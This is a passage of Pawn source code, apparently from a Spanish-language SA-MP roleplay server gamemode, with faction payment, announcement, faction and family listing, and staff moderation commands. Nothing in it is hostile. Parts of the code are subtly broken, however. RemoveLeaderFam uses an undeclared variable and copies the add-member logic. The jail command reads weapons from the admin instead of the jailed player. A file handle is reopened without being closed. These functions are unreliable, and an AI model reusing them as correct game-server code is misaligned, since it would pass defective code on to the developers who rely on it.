		    A_Format(Str,"> Pagaste a la policia "#CINFO"$%d",params[0]);
		    Mensaje(playerid,-1,Str);
		    ActualizarFacciones();
		    return 1;
		}
		else if(!strcmp(params[1],"Ejercito",true))
		{
		    InfoFaccion[IDLSEM][fDinero] += params[0];
		    InfoFaccion[IDGOBIERNO][fDinero] -= params[0];
		    new Str[120];
		    A_Format(Str,""#CAZUL2"[ATENCIÓN] > "#CBLANCO"El gobierno (Presidente: %s) pagó al ejército "#CINFO"$%d.",NombreJugador_(playerid),params[0]);
		    MensajeTodos(-1,Str);
		    A_Format(Str,"> Pagaste al ejército "#CINFO"$%d",params[0]);
		    Mensaje(playerid,-1,Str);
		    ActualizarFacciones();
		    return 1;
		}
		else if(!strcmp(params[1],"Hospital",true))
		{
		    InfoFaccion[IDLSMD][fDinero] += params[0];
		    InfoFaccion[IDGOBIERNO][fDinero] -= params[0];
		    new Str[120];
		    A_Format(Str,""#CAZUL2"[ATENCIÓN] > "#CBLANCO"El gobierno (Presidente: %s) pagó al hospital "#CINFO"$%d.",NombreJugador_(playerid),params[0]);
		    MensajeTodos(-1,Str);
		    A_Format(Str,"> Pagaste al hospital "#CINFO"$%d",params[0]);
		    Mensaje(playerid,-1,Str);
		    ActualizarFacciones();
		    return 1;
		}
		else if(!strcmp(params[1],"television",true))
		{
		    InfoFaccion[IDLSTV][fDinero] += params[0];
		    InfoFaccion[IDGOBIERNO][fDinero] -= params[0];
		    new Str[120];
		    A_Format(Str,""#CAZUL2"[ATENCIÓN] > "#CBLANCO"El gobierno (Presidente: %s) pagó a la televisión "#CINFO"$%d.",NombreJugador_(playerid),params[0]);
		    MensajeTodos(-1,Str);
		    A_Format(Str,"> Pagaste a la televisión "#CINFO"$%d",params[0]);
		    Mensaje(playerid,-1,Str);
		    ActualizarFacciones();
		    return 1;
		}
		else if(!strcmp(params[1],"mecanicos",true))
		{
		    InfoFaccion[IDMECANICOS][fDinero] += params[0];
		    InfoFaccion[IDGOBIERNO][fDinero] -= params[0];
		    new Str[120];
		    A_Format(Str,""#CAZUL2"[ATENCIÓN] > "#CBLANCO"El gobierno (Presidente: %s) pagó a los mecánicos "#CINFO"$%d.",NombreJugador_(playerid),params[0]);
		    MensajeTodos(-1,Str);
		    A_Format(Str,"> Pagaste a los mecánicos "#CINFO"$%d",params[0]);
		    Mensaje(playerid,-1,Str);
		    ActualizarFacciones();
		    return 1;
		}
		return ParamsINC(playerid,"/pagarfaccion [DINERO] <POLICIA - EJERCITO - HOSPITAL - TELEVISION - MECANICOS>");
	}

	CMD:gob(playerid,params[])
	{
		if(EsIP(params))
		{
			MensajeAdminF(C_ROJO, "[Anti-SPAM] "#CBLANCO"%s(%d): "#CINFO"/gob %s", Destacado, NombreJugador_(playerid), playerid, params);
			_Kick(playerid,T_ANTICHEAT,"SPAM");
			return 0;
		}
	    if(isnull(params)) return ParamsINC(playerid,"/gob [ANUNCIO]");
		if(InfoJugador[playerid][jLider] == IDLSPD)
		{
  			if(!IsPlayerInRangeOfPoint(playerid,2,256.2291,120.4342,1003.218)) return Error(playerid,"¡Aquí no puedes utilizar este comando!");
			MensajeTodosF(C_GOBIERNO,"[Policía] %s", params);
			return 1;
		}
		if(InfoJugador[playerid][jLider] == IDLSMD)
		{
			if(!IsPlayerInRangeOfPoint(playerid,2,2557.8733,1262.8485,866.3764)) return Error(playerid,"¡Aquí no puedes utilizar este comando!");
			MensajeTodosF(C_GOBIERNO,"[Hospital] %s", params);
			return 1;
		}
		if(InfoJugador[playerid][jLider] == IDLSEM)
		{
			if(!IsPlayerInRangeOfPoint(playerid,2,2744.3435,-2453.8425,13.8623)) return Error(playerid,"¡Aquí no puedes utilizar este comando!");
			MensajeTodosF(C_GOBIERNO,"[Ejército] %s", params);
			return 1;
		}
		if(InfoJugador[playerid][jLider] == IDGOBIERNO)
		{
			if(!IsPlayerInRangeOfPoint(playerid,2,358.7458,203.6272,1008.382)) return Error(playerid,"¡Aquí no puedes utilizar este comando!");
			MensajeTodosF(C_GOBIERNO,"[Gobierno] %s", params);
			return 1;
		}
		return Error(playerid, "No estás autorizado para utilizar este comando");
	}

	CMD:familias(playerid, params[])
	{
	    new
	        Str2[80],
	        Str[MAX_FAMILIAS*sizeof(Str2)],
			Count;

		Loop(i, MAX_FAMILIAS, 0)
		{
			if(!isnull(InfoFamilia[i][fNombre]))
			{
			    if(isnull(InfoFamilia[i][fLider]))
			    {
				    switch(strlen(InfoFamilia[i][fNombre]))
				    {
				        case 4..10:
				        {
					    	A_Format(Str2, ""#CBLANCO"> %s %s\t\t"#CROJO"(Libre)\n",
								InfoFamilia[i][fPandilla] ? ("Pandilla") : ("Mafia"),
								InfoFamilia[i][fNombre]);
						}
				        case 11..16:
				        {
					    	A_Format(Str2, ""#CBLANCO"> %s %s\t"#CROJO"(Libre)\n",
								InfoFamilia[i][fPandilla] ? ("Pandilla") : ("Mafia"),
								InfoFamilia[i][fNombre]);
						}
				       	default:
				        {
					    	A_Format(Str2, ""#CBLANCO"> %s %s "#CROJO"(Libre)\n",
								InfoFamilia[i][fPandilla] ? ("Pandilla") : ("Mafia"),
								InfoFamilia[i][fNombre]);
						}
					}
				}
				else
				{
				    switch(strlen(InfoFamilia[i][fNombre]))
				    {
				        case 4..10:
				        {
					    	A_Format(Str2, ""#CBLANCO"> %s %s\t\t"#CVERDE"(Lider: %s)\n",
								InfoFamilia[i][fPandilla] ? ("Pandilla") : ("Mafia"),
								InfoFamilia[i][fNombre],
								InfoFamilia[i][fLider]);
						}
				        case 11..16:
				        {
					    	A_Format(Str2, ""#CBLANCO"> %s %s\t"#CVERDE"(Lider: %s)\n",
								InfoFamilia[i][fPandilla] ? ("Pandilla") : ("Mafia"),
								InfoFamilia[i][fNombre],
								InfoFamilia[i][fLider]);
						}
				        default:
				        {
					    	A_Format(Str2, ""#CBLANCO"> %s %s "#CVERDE"(Lider: %s)\n",
								InfoFamilia[i][fPandilla] ? ("Pandilla") : ("Mafia"),
								InfoFamilia[i][fNombre],
								InfoFamilia[i][fLider]);
						}
					}
				}

				strcat(Str, Str2);
				Count++;
			}
		}
		A_Format(Str2, ""#CHAMBRE"Familias: "#CBLANCO"%d", Count);
		Dialog(playerid, dError, DIALOG_STYLE_MSGBOX, Str2, Str, "Cerrar", "");
		return 1;
	}

	CMD:facciones(playerid, params[])
	{
	    new
	        Str2[80],
	        Str[MAX_FAMILIAS*sizeof(Str2)],
			Count;

		Loop(i, MAX_FACCIONES, 1)
		{
		    if(isnull(InfoFaccion[i][fLider]))
		    {
			    switch(strlen(NombreFaccion(i)))
			    {
			        case 4..10:
			        {
				    	A_Format(Str2, ""#CBLANCO"> %s\t\t"#CROJO"(Sin lider)\n",
		       				NombreFaccion(i));
					}
			        case 11..16:
			        {
				    	A_Format(Str2, ""#CBLANCO"> %s\t"#CROJO"(Sin lider)\n",
		       				NombreFaccion(i));
					}
			        default:
			        {
				    	A_Format(Str2, ""#CBLANCO"> %s "#CROJO"(Sin lider)\n",
		       				NombreFaccion(i));
					}
				}
			}
			else
			{
			    switch(strlen(NombreFaccion(i)))
			    {
			        case 4..10:
			        {
				    	A_Format(Str2, ""#CBLANCO"> %s\t\t"#CVERDE"(Lider: %s)\n",
							NombreFaccion(i),
							InfoFaccion[i][fLider]);
					}
					case 11..16:
					{
				    	A_Format(Str2, ""#CBLANCO"> %s\t"#CVERDE"(Lider: %s)\n",
							NombreFaccion(i),
							InfoFaccion[i][fLider]);
					}
					default:
					{
				    	A_Format(Str2, ""#CBLANCO"> %s "#CVERDE"(Lider: %s)\n",
							NombreFaccion(i),
							InfoFaccion[i][fLider]);
					}
				}
			}
			strcat(Str, Str2);
			Count++;
		}

		A_Format(Str2, ""#CHAMBRE"Facciones: "#CBLANCO"%d", Count);
		Dialog(playerid, dError, DIALOG_STYLE_MSGBOX, Str2, Str, "Cerrar", "");
		return 1;
	}

// -========================== [FACCIONES] =================================- //

stock SetFacLeader(playerid, facid)
{
	if(!IsPlayerConnected(playerid))
	    return 0;

	if(isnull(InfoFaccion[facid][fLider]))
	{
		alm(InfoFaccion[facid][fLider], pName(playerid) );
	}
	else
	{
	    MensajeF(playerid, -1, "Ya hay un líder de la faccion, quedarás como "#CVERDE"Sub-Lider.");
	}
	ActualizarFacciones();
	return 1;
}

stock RemoveLeaderFac(playerid, fac)
{
	if(!strcmp(pName(playerid), InfoFaccion[fac][fLider]))
	{
	    ClearString(InfoFaccion[fac][fLider]);
		ActualizarFacciones();
		return 1;
	}
	return 0;
}

stock RemoveFromFac(name[], fac)
{
	new
	    str[40],
		members[50][MAX_PLAYER_NAME];

	format(str, sizeof(str), "Facciones/Miembros[%d].ini", fac);

	if(!fexist(str))
	    return 0;

	new
	    File: Members = fopen(str, io_read),
		i = -1,
		str2[MAX_PLAYER_NAME+1],
		lines,
		bool: suc = false;

	while(fread(Members, str2))
	{
	    i++;
		if(i >= sizeof(members)-1)
		{
		    printf("BUG: Se necesita incrementar MEMBERS de RemoveFromFac a %d!", i);
		    return 0;
		}
		if(strfind(str2, name) != 0)
		{
      		alm(members[i], str2);
		}
		else
		{
		    if(!suc)
		        suc = true;
		}
	}

	Members = fopen(str, io_write);

	lines = i;
	i = -1;

	do
	{
	    i++;
		fwrite(Members, members[i]);
	}
	while(i < lines);

	fclose(Members);

	if(suc)
	{
	    InfoFaccion[fac][fMiembros] --;
	    ActualizarFacciones();
	}

	return 1;
}

stock AddMemberToFac(playerid, facid)
{
	if(!IsPlayerConnected(playerid))
	    return 0;

	InfoFaccion[facid][fMiembros] ++;
	ActualizarFacciones();

	new
		str[30];

	A_Format(str, "Facciones/Miembros[%d].ini", facid);

	new
	    File: Members = fopen(str, io_append);

	A_Format(str, "%s\r\n", pName(playerid));

	fwrite(Members, str);
	fclose(Members);

	return 1;
}

// -========================== [FAMILIAS] ==================================- //
stock SetFamLeader(playerid, famid)
{
	if(!IsPlayerConnected(playerid))
	    return 0;

	if(isnull(InfoFamilia[famid][fLider]))
	{
		alm(InfoFamilia[famid][fLider], pName(playerid) );
		ActualizarFamilia(famid);
	}
	else
	{
	    MensajeF(playerid, -1, "Ya hay un líder de la familia, quedarás como "#CVERDE"Sub-Lider.");
	}
	return 1;
}

stock RemoveLeaderFam(playerid, fam)
{
	if(!IsPlayerConnected(playerid))
	    return 0;

	InfoFamilia[famid][fMiembros] ++;
	ActualizarFamilia(famid);

	new
		str[30];

	A_Format(str, "Familias/Miembros[%d].ini", famid);

	new
	    File: Members = fopen(str, io_append);

	A_Format(str, "%s\r\n", pName(playerid));

	fwrite(Members, str);
	fclose(Members);

	return 1;
}


	// --=======[ COMANDOS DESTACADO ]========-- //

	CMD:a(playerid,params[])
	{
		if(Staff(playerid,Destacado)) return 1;
		if(isnull(params)) return ParamsINC(playerid, "/a [Texto]");
		MensajeAdminF(C_ADMINCHAT ,"(( /a: %s %s (ID:%d) "#CBLANCO": %s "#CADMINCHAT"))",Destacado,CheckRangoADM(playerid),NombreJugador_(playerid),playerid,params);
		return 1;
	}

	CMD:colorveh(playerid,params[])
	{
		Para_Admin_Servicio
		Comando_En_Auto
		if(Staff(playerid,Mod.Superior)) return 1;
		if(sscanf(params,"ii",params[0],params[1])) return ParamsINC(playerid,"/colorveh [COLOR1] [COLOR2]");
		new VehID = GetPlayerVehicleID(playerid);
		ChangeVehicleColor(VehID,params[0],params[1]);
		if(VehVenta_ID(VehID))
		{
			InfoVeh[VehVenta_ID(VehID)][vColor1] = params[0];
			InfoVeh[VehVenta_ID(VehID)][vColor2] = params[1];
			ActualizarVehiculo(VehVenta_ID(VehID));
		}
		MensajeF(playerid,-1,"Le cambiaste el color a este vehículo: "#CAZUL2"%d - %d",params[0],params[1]);
		return 1;
	}

	CMD:idveh(playerid,params[])
	{
		Comando_En_Auto
		if(Staff(playerid,Destacado)) return 1;
		MensajeF(playerid,-1,"Información del Vehículo: "#CINFO"[ ID GENERAL: %i | ID VENTA: %i ]",GetPlayerVehicleID(playerid),VehVenta_ID(GetPlayerVehicleID(playerid)));
		return 1;
	}


	CMD:irlugar(playerid,params[])
	{
		if(Staff(playerid,Moderador)) return 1;
		Para_Admin_Servicio
		ShowPlayerDialog(playerid,dAdmTeleport,DIALOG_STYLE_LIST,""#CINFO"Menu de teleport's",MENU_ADMTELEPORT,"Ir","Cancelar");
		return 1;
	}

	CMD:admservice(playerid)
	{
	    if(Staff(playerid,Ayudante)) return 1;
		if(GetPVarInt(playerid, "ADMIN_ONDUTY"))
		{
		    SetPlayerColor(playerid, 0xFFFFFF00);
			if(RangoADM[playerid] != Text3D:INVALID_3DTEXT_ID)
			{
			    Delete3DTextLabel(RangoADM[playerid]);
			    RangoADM[playerid] = Text3D:INVALID_3DTEXT_ID;
			}
			DeletePVar(playerid,"ADMIN_ONDUTY");
			TextDrawShowForPlayer(playerid, Barraversion);
			ShowProgressBarForPlayer(playerid, BHambre[playerid]);
			ShowProgressBarForPlayer(playerid, BCansancio[playerid]);
			ShowProgressBarForPlayer(playerid, BOrina[playerid]);
			ShowProgressBarForPlayer(playerid, BExp[playerid]);
			
			new
			    h, m, s;
			    
			gettime(h, m, s);
			if(InfoJugador[playerid][jDutyS] <= h < InfoJugador[playerid][jDutyF])
			{
				Dialog(playerid, dJustificarOffD, DIALOG_STYLE_INPUT, "Justifica tu auscencia", ""#CBLANCO"No deberías ponerte Off-Duty en este momento, aún no cumpliste tu horario.\n\nEscribe una justificación: ¿Por qué te retiras antes?", "Aceptar", "");
			}
			else
			    LogAdmin(playerid, "salió de servicio.");
		}
		else
		{
  			//SetPlayerSkin(playerid, 217);
  			
			if(InfoJugador[playerid][jAdmin] >= Moderador)
   		  		SetPlayerColor(playerid, 0xFF000000);
   				
			if(RangoADM[playerid] == Text3D:INVALID_3DTEXT_ID)
			{
	  			RangoADM[playerid] = Create3DTextLabel(CheckRangoADM(playerid),0xFFFFFF82,0,0,0,50,false);
			}
			Attach3DTextLabelToPlayer(RangoADM[playerid], playerid, 0, 0, 0.3 );
			SetPVarInt(playerid,"ADMIN_ONDUTY",1);

			TextDrawHideForPlayer(playerid, Barraversion);
			HideProgressBarForPlayer(playerid, BHambre[playerid]);
			HideProgressBarForPlayer(playerid, BCansancio[playerid]);
			HideProgressBarForPlayer(playerid, BOrina[playerid]);
			HideProgressBarForPlayer(playerid, BExp[playerid]);

			new
			    h, m, s;

			gettime(h, m, s);
			if(InfoJugador[playerid][jDutyS] <= h < InfoJugador[playerid][jDutyF])
			{
			    MensajeF(playerid, -1, "Te colocaste OnDuty. Recuerda que debes cumplir tu horario administrativo hasta las %dhs para no ser sancionado.", InfoJugador[playerid][jDutyF]);
			}
			else
			{
			    MensajeF(playerid, -1, "Te colocaste OnDuty, pero fuera del horario administrativo.");
			}
			LogAdmin(playerid, "se puso en servicio.");
		}
		return 1;
	}

stock LogAdmin(playerid, log[])
{
	new
	    path[MAX_PLAYER_NAME + 10];
	    
	A_Format(path, "Admins/%s.txt", pName(playerid) );
	Log(path, log);
	return 1;
}

	CMD:material(playerid, params[])
	{
	    if(Staff(playerid,Administrador)) return 1;

	    new
			objectid,
			materialindex,
			modelid,
			txdname[30],
			texturename[30],
			materialcolor;

	    if(sscanf(params, "p<,>iiis[30]s[30]h", objectid, materialindex, modelid, txdname, texturename, materialcolor)) return ParamsINC(playerid, "/Material objectid materialindex modelid txdname texturename materialcolor");

	    SetDynamicObjectMaterial(objectid, materialindex, modelid, txdname, texturename, materialcolor);
	    return 1;
	}

	CMD:crearmineral(playerid, params[])
	{
	    if(Staff(playerid,Administrador)) return 1;

	    new
	        Col;

		if(isnull(params))
		{
  			return Mensaje(playerid, C_INFO, "Items: "#CBLANCO"Oro, Plata, Hierro, Rubi, Esmeralda, Zafiro, Diamante, Carbón");
		}

		if(!strcmp(params, "Oro", true)) Col = MIN_ORO;
		else if(!strcmp(params, "Plata", true)) Col = MIN_PLATA;
		else if(!strcmp(params, "Hierro", true)) Col = MIN_HIERRO;
		else if(!strcmp(params, "Rubi", true)) Col = MIN_RUBI;
		else if(!strcmp(params, "Esmeralda", true)) Col = MIN_ESMERALDA;
		else if(!strcmp(params, "Zafiro", true)) Col = MIN_ZAFIRO;
		else if(!strcmp(params, "Diamante", true)) Col = MIN_DIAMANTE;
		else if(!strcmp(params, "Carbon", true)) Col = MIN_CARBON;

		new
		    Float: Pos[6],
			ObjectID;

		GetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);
		GetPlayerCameraFrontVector(playerid, Pos[3], Pos[4], Pos[5]);

	    Loop(i, 3, 0)
			Pos[i] += Pos[i+3];

		ObjectID = CreateDynamicObject(3931, Pos[0], Pos[1], Pos[2], 0, 0, 0);
		SetDynamicObjectMaterial(ObjectID, 0, 3931, "none", "none", Col);
		Streamer_Update(playerid);
		EditDynamicObject(playerid, ObjectID);
		SetPVarInt(playerid, "AcomodandoMinerales", true);
		return 1;
	}

	// ----=============[ COMANDOS MODERADOR ]=============----- //

	CMD:lp(playerid,params[])
	{
	    if(Staff(playerid,Moderador)) return 1;
	    foreach(Player,i) LimpiarPantalla(i,101);
	    MensajeTodosF(C_ROJO,"[ADMINISTRACIÓN] "#CBLANCO"> El chat, fue limpiado por %s",NombreJugador_(playerid));
	    return 1;
	}
	
	CMD:slap(playerid, params[])
	{
	    if(Staff(playerid,Moderador)) return 1;
		Para_Admin_Servicio
		if(sscanf(params, "u", params[0])) return ParamsINC(playerid, "/slap [ID/Nombre]");
		if(params[0] == INVALID_PLAYER_ID) return Error(playerid, "¡Jugador desconectado!");
		new Float:x, Float:y, Float:z;
		GetPlayerPos(params[0], x, y, z);
		SetPlayerPos(params[0], x, y, z+6.0);
		TextoJugador(params[0], "~p~bofeteado", 3000, 3);
		return 1;
	}
	
	CMD:ls(playerid, params[])
	{
	    if(Staff(playerid,Moderador)) return 1;
		Para_Admin_Servicio
		if(sscanf(params, "u", params[0])) return Error(playerid, "/ls [ID/Nombre]");
		if(params[0] == INVALID_PLAYER_ID) return Error(playerid, "¡Jugador desconectado!");
		SetPlayerPos(params[0], 1482.6365,-1742.8387,13.5469);
		SetPlayerInterior(params[0], 0);
		SetPlayerVirtualWorld(params[0], 0);
		TextoJugador(params[0], "~p~enviado a LS", 3000, 3);
		return 1;
	}

	CMD:jail(playerid, params[])
	{
	    if(Staff(playerid,Moderador)) return 1;
		Para_Admin_Servicio
		if(sscanf(params, "uis[105]", params[0], params[1], params[2])) return ParamsINC(playerid, "/jail [ID/Nombre] [Minutos] [Razón]");
		if(params[0] == INVALID_PLAYER_ID) return Error(playerid, "¡Jugador desconectado!");

		new
			time = params[1],
			str[15], weap1, weap2,
			Float: Pos[3];

		Loop(i, 13, 0)
		{
			A_Format(str, "ADM_Weap%02d", i);
			DeletePVar(playerid, str);
			A_Format(str, "ADM_Ammo%02d", i);
			DeletePVar(playerid, str);
		    weap1 = 0; weap2 = 0;
		    GetPlayerWeaponData(playerid, i, weap1, weap2);
			if(weap1)
			{
				A_Format(str, "ADM_Weap%02d", i);
				SetPVarInt(params[0], str, weap1);
				A_Format(str, "ADM_Ammo%02d", i);
				SetPVarInt(params[0], str, weap2);
			}
		}
		GetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);
		
		SetPVarFloat(params[0], "ADM_Posx", Pos[0]);
		SetPVarFloat(params[0], "ADM_Posy", Pos[1]);
		SetPVarFloat(params[0], "ADM_Posz", Pos[2]);
		SetPVarInt(params[0], "ADM_VW", GetPlayerVirtualWorld(params[0]));
		SetPVarInt(params[0], "ADM_Int", GetPlayerInterior(params[0]));

		MandarCarcel(params[0],time,true);
		Mensaje(params[0], 1,  "=========================================================================");
		MensajeF(params[0], -1,"- Fuiste encarcelado por %s "#CROJO"(%d minutos - Razón: %s)",NombreJugador(playerid), time, params[2]);
		Mensaje(params[0], 1,  "=========================================================================");
		MensajeTodosF(C_ROJO, "[ADMINISTRACIÓN] > "#CBLANCO"%s encarcelo a %s "#CROJO"[%d min-%s]", NombreJugador_(playerid), NombreJugador_(params[0]), time, params[2]);
		TextoJugador(params[0], "~r~encarcelado", 5000, 3);
		return 1;
	}

	CMD:money(playerid, params[])
	{
	    if(Staff(playerid,SubDueno)) return 1;
		Para_Admin_Servicio
		if(sscanf(params, "ui", params[0], params[1])) return ParamsINC(playerid, "/money [ID/Nombre] [Dinero]");
		if(params[0] == INVALID_PLAYER_ID) return Error(playerid, "¡Jugador desconectado!");
		GivePlayerMoney(params[0], params[1]);
		new
		    str[80];
		A_Format(str, "%s le dió $%d a %s", pName(playerid), params[1], pName(params[0]) );
		Log("LOG/AdminMoney.txt", str);
		MensajeF(params[0], -1, "El administrador "#CINFO"%s "#CBLANCO"te dió "#CVERDE"$%d", NombreJugador_(playerid), params[1]);
		MensajeF(playerid, -1, "Le diste a "#CINFO"%s "#CBLANCO"una cantidad de dinero de "#CVERDE"$%d", NombreJugador_(params[0]), params[1]);
		MensajeAdminF(C_ROJO, "[ADMINISTRACIÓN] > "#CBLANCO"%s le dio a %s "#CVERDE"$%d", Ayudante, NombreJugador_(playerid), NombreJugador_(params[0]), params[1]);
		return 1;
	}
	
	CMD:liberar(playerid, params[])
	{
	    if(Staff(playerid,Moderador)) return 1;
		Para_Admin_Servicio
		if(sscanf(params, "u", params[0])) return ParamsINC(playerid, "/liberar [ID/Nombre]");
		if(params[0] == INVALID_PLAYER_ID) return Error(playerid, "¡Jugador desconectado!");
		if(GetPVarFloat(params[0], "ADM_Posx") == 0.0) return Error(playerid, "Este comando no tiene efecto después de reloguear.");

		TextoJugador(params[0], "~g~liberado", 5000, 3);
		
		InfoJugador[params[0]][jTiempoCarcel] = 0;
		InfoJugador[params[0]][jEncarcelado] = 0;
		KillTimer2(params[0],TIMER_CARCEL);
		//Pos
		SetPlayerPos(params[0], GetPVarFloat(params[0], "ADM_Posx"), GetPVarFloat(params[0], "ADM_Posy"), GetPVarFloat(params[0], "ADM_Posz") );
		DeletePVar(params[0], "ADM_Posx"); DeletePVar(params[0], "ADM_Posy"); DeletePVar(params[0], "ADM_Posz");
		//Vw
		SetPlayerInterior(params[0], GetPVarInt(params[0], "ADM_Int") );
		SetPlayerVirtualWorld(params[0], GetPVarInt(params[0], "ADM_VW") );
		DeletePVar(params[0], "ADM_Int"); DeletePVar(params[0], "ADM_VW");
		//Armas
/*		new
		    str[15];
		Loop(i, 13, 0)
		{
			A_Format(str, "ADM_Weap%02d", i);
			new weap = GetPVarInt(params[0], str);
			if(weap != 0)
			{
				A_Format(str, "ADM_Ammo%02d", i);
				GivePlayerWeapon(params[0], weap, GetPVarInt(params[0], str));
				DeletePVar(params[0], str);
				A_Format(str, "ADM_Weap%02d", i);
				DeletePVar(params[0], str);
			}
		}*/
		Mensaje(playerid, -1, "Liberaste al jugador correctamente, devolviendo todos sus datos.");
		return 1;
	}
	
	CMD:spec(playerid,params[])
	{
	    if(Staff(playerid,Moderador)) return 1;
	    if(sscanf(params,"u",params[0])) return ParamsINC(playerid,"/spectar [ID/NOMBRE]");
		if(!IsPlayerConnected(params[0])) return Error(playerid,"¡Jugador desconectado!");
		if(Specteando_ID[playerid] != INVALID_PLAYER_ID)
		{
		    Specteado_Por[Specteando_ID[playerid]] = INVALID_PLAYER_ID;
		}
		Specteando_ID[playerid] = params[0];
		Specteado_Por[params[0]] = playerid;
  		TogglePlayerSpectating(playerid,true);

  		if(IsPlayerInAnyVehicle(params[0]))
  		{
  		    PlayerSpectateVehicle(playerid, GetPlayerVehicleID(params[0]));
		}
		else
		{
			PlayerSpectatePlayer(playerid, params[0]);
		}

		//MensajeAdminF(C_ROJO,"[ADMINISTRACIÓN] > "#CBLANCO"%s comenzó a spectear a %s",InfoJugador[playerid][jAdmin],NombreJugador_(playerid),NombreJugador_(params[0]));
		SetPlayerInterior(playerid,GetPlayerInterior(params[0]));
		SetPlayerVirtualWorld(playerid,GetPlayerVirtualWorld(params[0]));
		Mensaje(playerid,-1,"Utiliza constantemente el comando /actualizarspec, para ajustar el spec.");
		return 1;
	}

	CMD:dejarspec(playerid,params[])
	{
	    if(Staff(playerid,Moderador)) return 1;
	    if(Specteando_ID[playerid] != INVALID_PLAYER_ID)
	    {
	        TogglePlayerSpectating(playerid,false);
	        SetPlayerPos(playerid,PosJugador[X],PosJugador[Y],PosJugador[Z]);
	        SetPlayerInterior(playerid,InfoJugador[playerid][jInterior]);
	        SetPlayerVirtualWorld(playerid,InfoJugador[playerid][jVirtualWorld]);
			//MensajeAdminF(C_ROJO,"[ADMINISTRACIÓN] > "#CBLANCO"%s dejó de spectear a %s",InfoJugador[playerid][jAdmin],NombreJugador_(playerid),NombreJugador_(Specteando_ID[playerid]));
			Specteado_Por[Specteando_ID[playerid]] = INVALID_PLAYER_ID;
			Specteando_ID[playerid] = INVALID_PLAYER_ID;
			SetPVarInt(playerid,"Spawn_Spec",1);
			return 1;
		}
		return Error(playerid,"¡No estás specteando a nadie!");
	}

	CMD:actualizarspec(playerid,params[])
	{
	    if(Staff(playerid,Moderador)) return 1;
	    if(Specteando_ID[playerid] == INVALID_PLAYER_ID) return Error(playerid,"¡No estas specteando a nadie!");
		new
			i = Specteando_ID[playerid];

	    SetPlayerInterior(playerid,GetPlayerInterior(i));
	    SetPlayerVirtualWorld(playerid,GetPlayerVirtualWorld(i));
		return 1;
	}

	CMD:revivir(playerid, params[])
	{
	    if(Staff(playerid,Moderador)) return 1;
		Para_Admin_Servicio
		if(sscanf(params, "u", params[0])) return ParamsINC(playerid, "/revivir [ID/Nombre]");
		if(params[0] == INVALID_PLAYER_ID) return Error(playerid, "¡Jugador desconectado!");
		if(!InfoJugador[params[0]][jMuerto]) return Error(playerid, "¡Ese jugador no está muerto!");
		SetPlayerHealth(params[0], 100.0);
		InfoJugador[params[0]][jMuerto] = false;
		KillTimer2(params[0], TIMER_VAAMORIR);
		new str[4];
		valstr(str, params[0]);
		cmd_slap(playerid, str);
		TextoJugador(params[0], "~g~revivido.", 5000, 3);
		return 1;
	}

	CMD:sethp(playerid, params[])
	{
	    if(Staff(playerid,SubDueno)) return 1;
		Para_Admin_Servicio
		if(sscanf(params, "ui", params[0], params[1])) return ParamsINC(playerid, "/sethp [ID/Nombre] [Vida]");
		if(params[0] == INVALID_PLAYER_ID) return Error(playerid, "¡Jugador desconectado!");
		SetPlayerHealth(params[0], params[1]);
		return 1;
	}
	
	CMD:setarmour(playerid, params[])
	{
	    if(Staff(playerid,SubDueno)) return 1;
		Para_Admin_Servicio
		if(sscanf(params, "ui", params[0], params[1])) return ParamsINC(playerid, "/setarmour [ID/Nombre] [Chaleco]");
		if(params[0] == INVALID_PLAYER_ID) return Error(playerid, "¡Jugador desconectado!");
		SetPlayerArmour(params[0], params[1]);
		return 1;
	}

	CMD:malnombre(playerid, params[])
	{
	    if(Staff(playerid,Moderador)) return 1;
	    if(sscanf(params, "u", params[0])) return ParamsINC(playerid, "/malnombre [ID]");
	    if(params[0] == INVALID_PLAYER_ID) return Error(playerid, "Jugador desconectado");
		MensajeTodosF(C_ROJO, "[ADMINISTRACIÓN] > "#CBLANCO"%s expulsó a %s por tener nombre inválido.", NombreJugador_(playerid), NombreJugador_(params[0]) );
		playerid = params[0];
     	Mensaje(playerid, 1, "=========================================================");
	    Mensaje(playerid, C_AMARILLO,"Atención: "#CBLANCO"Con ese nombre no puede entrar al servidor. En este modo de juego");
	    MensajeF(playerid,-1,"se intenta imitar al máximo la vida real, y el nombre "#CROJO"%s "#CBLANCO"no es real.", pName(playerid) );
	    Mensaje(playerid, -1,"Pongase un nombre realista con formato "#CAMARILLO"Nombre_Apellido"#CBLANCO", ejemplo "#CVERDE"Tomas_Fernandez.");
	    Mensaje(playerid, -1,"No se permiten nombres de famosos, como "#CROJO"Jenifer_Lopez.");
	    Mensaje(playerid, -1,"Si su nombre cumple el formato, pero hace burla, o rompe otras reglas serás expulsado por un administrador.");
	    Mensaje(playerid, 1, "=========================================================");
		SetTimerEx("_KickEx2", 1000, false, "i", playerid);
		return 1;
	}
	
	CMD:kick(playerid,params[])
	{
	    if(Staff(playerid,Moderador)) return 1;
		if(EsIP(params))
		{
			MensajeAdminF(C_ROJO, "[Anti-SPAM] "#CBLANCO"%s(%d): "#CINFO"/kick %s", Destacado, NombreJugador_(playerid), playerid, params);
			_Kick(playerid,T_ANTICHEAT,"SPAM (/kick)");
			return 0;
		}
		if(sscanf(params,"us[100]",params[0],params[1])) return ParamsINC(playerid,"/kick [NOMBRE/ID] [RAZÓN]");
		if(!IsPlayerConnected(params[0])) return Error(playerid,"¡Jugador desconectado!");
		return _Kick(params[0],pName(playerid),params[1]);
	}

	CMD:givegun(playerid,params[])
	{
	    if(Staff(playerid,SubDueno)) return 1;
	    Para_Admin_Servicio
	    if(sscanf(params,"uii",params[0],params[1],params[2])) return ParamsINC(playerid,"/givegun [ID/NOMBRE] [ID_ARMA] [BALAS]");
		if(params[0] == INVALID_PLAYER_ID) return Error(playerid, "¡Jugador desconectado!");
	    GivePlayerWeapon(params[0],params[1],params[2]);
	    new Arma[24];
	    GetWeaponName(params[1],Arma,sizeof Arma);
	    MensajeAdminF(C_ROJO,"[ADMINISTRACIÓN] "#CBLANCO"> %s le dio a %s un(a) %s (ID %d) con %d balas",Ayudante,NombreJugador_(playerid),NombreJugador_(params[0]),Arma,params[1],params[2]);
	    return 1;
	}
	
	CMD:rtcar(playerid, params[])
	{
	    if(Staff(playerid,Administrador)) return 1;
		Para_Admin_Servicio
		if(sscanf(params, "i", params[0])) return ParamsINC(playerid, "/rtcar [ID Vehiculo]");
		if(!IsValidVehicle(params[0])) return Error(playerid, "¡ID Incorrecto!");
		SetVehicleToRespawn(params[0]);
		TextoJugador(playerid, "~p~respawneado", 3000, 3);
		return 1;
	}

	CMD:rtc(playerid,params[])
	{
